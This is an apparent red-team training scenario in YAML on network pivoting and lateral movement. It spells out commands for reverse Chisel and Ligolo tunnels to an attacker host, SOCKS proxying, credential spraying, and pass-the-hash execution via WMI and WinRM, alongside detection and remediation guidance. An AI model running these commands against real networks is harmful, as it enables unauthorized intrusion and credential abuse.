@@ -1,0 +1,251 @@
+# Category: Offensive Security - Lateral Movement & Pivoting
+name: "Lateral Movement and Network Pivoting"
+id: "redteam-lateral-pivot-001"
+category: "offensive_security"
+subcategory: "lateral_movement"
+difficulty: "advanced"
+estimated_time: "90"
+
+tags:
+  - lateral-movement
+  - pivoting
+  - ssh-tunneling
+  - socks-proxy
+  - port-forwarding
+  - chisel
+  - ligolo
+  - proxychains
+  - winrm
+  - wmi
+  - psexec
+  - red-team
+  - mitre-t1021
+  - mitre-t1090
+  - pentest
+  - authorized-engagement
+
+description: |
+  Establish network pivots and perform lateral movement across segmented
+  networks during authorized red team engagements. Covers SSH tunneling,
+  SOCKS proxy setup, and remote execution via WMI and WinRM.
+
+learning_objectives:
+  - Establish SOCKS proxies through compromised hosts for network pivoting
+  - Use SSH local/remote/dynamic port forwarding for access to internal segments
+  - Execute commands on remote hosts via WMI, WinRM, and PsExec
+  - Chain multiple pivots to reach deeply segmented target networks
+
+tools:
+  - "chisel"
+  - "ligolo-ng"
+  - "proxychains4"
+  - "ssh"
+  - "evil-winrm"
+  - "impacket"
+
+prerequisites:
+  - "Initial foothold on a compromised host"
+  - "Valid credentials or hashes for lateral movement"
+  - "Written authorization for full network scope"
+  - "Network diagram showing target segments"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Map internal network from initial foothold"
+    commands:
+      - "# Identify network interfaces and routes on pivot host"
+      - "ip addr show && ip route show"
+      - "# Windows equivalent"
+      - "ipconfig /all && route print"
+      - "# Quick host discovery via ICMP sweep"
+      - "for i in $(seq 1 254); do ping -c1 -W1 [internal_subnet].$i &>/dev/null && echo '[internal_subnet].$'i; done"
+      - "# Or with nmap through pivot"
+      - "nmap -sn [internal_range] --min-rate 1000"
+      - "# ARP scan (faster, Layer 2)"
+      - "arp-scan --localnet 2>/dev/null || arp -n"
+    expected_output: "Internal network map with live hosts reachable from pivot"
+    detection: "ICMP sweep from compromised host in internal IDS logs"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Setup SOCKS proxy via SSH dynamic port forwarding"
+    commands:
+      - "# Dynamic port forward — creates SOCKS5 proxy on attacker machine"
+      - "ssh -D 1080 -N -f [pivot_user]@[pivot_host]"
+      - "# Verify SOCKS proxy running"
+      - "ss -antp | grep 1080"
+      - "# Configure proxychains"
+      - "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"
+      - "# Use proxychains to route tools through pivot"
+      - "proxychains4 nmap -sT -p22,80,443,445,3389 [internal_host]"
+      - "proxychains4 crackmapexec smb [internal_range] -u [username] -p [password]"
+      - "proxychains4 evil-winrm -i [internal_host] -u [username] -p [password]"
+    expected_output: "SOCKS5 proxy established — all proxychains traffic routed through pivot"
+    detection: "Long-lived SSH connection with -D flag; SOCKS traffic patterns"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Fast pivot with Chisel TCP tunneling"
+    commands:
+      - "# On attacker machine — start Chisel server"
+      - "./chisel server -p 8080 --reverse"
+      - "# On pivot host — connect back and create SOCKS proxy"
+      - "./chisel client [attacker_ip]:8080 R:socks"
+      - "# Chisel now creates SOCKS5 on attacker:1080"
+      - "proxychains4 nmap -sT -Pn -p445 [internal_range]"
+      - "# Multiple tunnels — chain pivots"
+      - "# Pivot 1 -> Pivot 2 -> Target"
+      - "./chisel client [attacker_ip]:8080 R:8888:socks"
+      - "# On Pivot 2 (reached via proxychains through Pivot 1)"
+      - "proxychains4 ./chisel client [pivot1]:8888 R:socks"
+    expected_output: "Chisel reverse SOCKS proxy — attacker can reach isolated segments"
+    detection: "Outbound TCP connection from internal host to attacker on port 8080"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Pivot with Ligolo-ng (kernel tunnel — no proxychains needed)"
+    commands:
+      - "# On attacker — start ligolo proxy"
+      - "sudo ip tuntap add user [username] mode tun ligolo"
+      - "sudo ip link set ligolo up"
+      - "./proxy -selfcert -laddr 0.0.0.0:11601"
+      - "# On pivot host — connect agent"
+      - "./agent -connect [attacker_ip]:11601 -ignore-cert"
+      - "# In ligolo console — start tunnel"
+      - "session"
+      - "start"
+      - "# Add route for internal subnet on attacker"
+      - "sudo ip route add [internal_range] dev ligolo"
+      - "# Now reach internal hosts directly without proxychains"
+      - "nmap -sS -p445 [internal_host]"
+      - "evil-winrm -i [internal_host] -u [username] -p [password]"
+    expected_output: "Ligolo TUN interface — attacker routes directly to internal network"
+    detection: "Agent process on pivot host; outbound connection to attacker on port 11601"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Lateral movement via WMI remote execution"
+    commands:
+      - "# WMI execution — runs command on remote Windows host"
+      - "impacket-wmiexec '[domain]/[username]:[password]@[target_ip]'"
+      - "# Pass-the-Hash via WMI"
+      - "impacket-wmiexec '[domain]/[username]' -hashes ':[ntlm_hash]' @[target_ip]"
+      - "# Execute specific command"
+      - "impacket-wmiexec '[domain]/[username]:[password]@[target_ip]' 'whoami'"
+      - "# Via proxychains"
+      - "proxychains4 impacket-wmiexec '[domain]/[username]:[password]@[internal_host]'"
+      - "# WMI from Windows pivot host"
+      - "wmic /node:[target_ip] /user:[username] /password:[password] process call create 'cmd.exe /c whoami > C:\\temp\\out.txt'"
+    expected_output: "Remote command execution on target Windows host via WMI"
+    detection: "Event ID 4688: WmiPrvSE spawning child processes; DCOM connections Event 4624"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Lateral movement via WinRM (PowerShell remoting)"
+    commands:
+      - "# Evil-WinRM for interactive session"
+      - "evil-winrm -i [target_ip] -u [username] -p [password]"
+      - "# Pass-the-Hash"
+      - "evil-winrm -i [target_ip] -u [username] -H [ntlm_hash]"
+      - "# PowerShell remoting from Windows"
+      - "Enter-PSSession -ComputerName [target_ip] -Credential (Get-Credential)"
+      - "# Non-interactive command execution"
+      - "Invoke-Command -ComputerName [target_ip] -ScriptBlock { whoami; hostname } -Credential [cred]"
+      - "# Via impacket"
+      - "proxychains4 evil-winrm -i [internal_host] -u [username] -H [ntlm_hash]"
+    expected_output: "Interactive PowerShell session on target via WinRM port 5985"
+    detection: "Event ID 4624 Type 3 Kerberos logon; WinRM connection on port 5985/5986"
+
+  - id: "step7"
+    phase: "exploitation"
+    action: "SSH local port forwarding to reach internal services"
+    commands:
+      - "# Forward local port to internal service via pivot"
+      - "ssh -L 13389:[internal_rdp_host]:3389 [pivot_user]@[pivot_host] -N -f"
+      - "# Now RDP to localhost:13389 reaches internal host"
+      - "xfreerdp /v:127.0.0.1:13389 /u:[username] /p:[password]"
+      - "# Forward to internal web application"
+      - "ssh -L 18080:[internal_web]:80 [pivot_user]@[pivot_host] -N -f"
+      - "curl http://127.0.0.1:18080/"
+      - "# Forward to internal database"
+      - "ssh -L 11433:[internal_db]:1433 [pivot_user]@[pivot_host] -N -f"
+      - "# Remote port forwarding — expose attacker service to internal network"
+      - "ssh -R 8443:127.0.0.1:443 [pivot_user]@[pivot_host] -N -f"
+    expected_output: "Internal services accessible locally via SSH port forwarding tunnels"
+    detection: "Long-lived SSH sessions with port forwarding; unusual local port bindings"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1021.001"
+    description: "Remote Services: Remote Desktop Protocol"
+  - standard: "MITRE ATT&CK"
+    control: "T1021.006"
+    description: "Remote Services: Windows Remote Management"
+  - standard: "MITRE ATT&CK"
+    control: "T1090"
+    description: "Proxy — tunnel-based network pivoting"
+  - standard: "NIST 800-53 Rev5"
+    control: "SC-7"
+    description: "Boundary protection — validate controls against pivoting"
+  - standard: "PCI DSS v4.0"
+    control: "1.3.1"
+    description: "Restrict inbound traffic — validate segmentation"
+
+detection:
+  network_indicators:
+    - "Long-lived outbound connections from internal hosts to external IPs"
+    - "SOCKS proxy traffic patterns (sequential connections through single host)"
+    - "Chisel/Ligolo agent binary execution and outbound C2 connection"
+  log_indicators:
+    - "Event ID 4688: WmiPrvSE.exe or wsmprovhost.exe spawning cmd/powershell"
+    - "Event ID 4624 Type 3: WinRM logon from unexpected source"
+    - "Firewall: outbound tunnel traffic on non-standard ports"
+  endpoint_indicators:
+    - "Chisel or Ligolo agent binary on pivot host"
+    - "SSH process with -D or -L flags indicating tunneling"
+    - "Proxychains process executions on pivot host"
+
+remediation:
+  immediate:
+    - "Terminate identified pivot sessions and contain compromised hosts"
+    - "Block outbound connections from internal hosts to attacker infrastructure"
+    - "Reset credentials used for lateral movement"
+  long_term:
+    - "Implement host-based firewall rules restricting WMI and WinRM to jump servers"
+    - "Block workstation-to-workstation SMB and WinRM (allow only from management hosts)"
+    - "Deploy privileged access workstations (PAW) for all admin activities"
+    - "Implement network detection for SOCKS proxy and tunneling patterns"
+
+variables:
+  attacker_ip: "10.10.10.1"
+  pivot_host: "10.10.1.50"
+  pivot_user: "www-data"
+  internal_subnet: "192.168.2"
+  internal_range: "192.168.2.0/24"
+  internal_host: "192.168.2.10"
+  internal_rdp_host: "192.168.2.20"
+  internal_web: "192.168.2.30"
+  internal_db: "192.168.2.40"
+  target_ip: "192.168.2.10"
+  username: "administrator"
+  password: "Password123!"
+  ntlm_hash: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+  domain: "corp.example.com"
+
+assessment_questions:
+  - "What is the difference between SSH local, remote, and dynamic port forwarding?"
+  - "How does Ligolo-ng differ from Chisel for network pivoting?"
+  - "Why is WMI execution preferred over PsExec for stealthy lateral movement?"
+  - "How does proxychains route non-SOCKS-aware tools through a SOCKS proxy?"
+  - "What network detection controls can identify SOCKS proxy tunneling?"
+
+references:
+  - url: "https://github.com/jpillora/chisel"
+    title: "Chisel TCP Tunneling Tool"
+  - url: "https://github.com/nicocha30/ligolo-ng"
+    title: "Ligolo-ng Network Pivot"
+  - url: "https://attack.mitre.org/techniques/T1090/"
+    title: "MITRE ATT&CK T1090 Proxy"
+  - url: "https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding"
+    title: "HackTricks Tunneling and Port Forwarding"
